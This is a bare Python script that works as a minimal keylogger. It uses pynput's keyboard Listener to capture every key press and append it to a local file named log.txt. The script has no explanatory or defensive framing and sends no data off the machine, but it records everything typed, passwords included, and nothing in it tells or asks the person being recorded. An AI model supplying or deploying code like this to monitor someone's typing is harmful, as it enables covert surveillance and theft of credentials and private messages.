from pynput.keyboard import Listener

def wrtofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    with open("log.txt","a") as f:
        f.write(keydata)

with Listener(on_press=wrtofile) as l:
   l.join()   
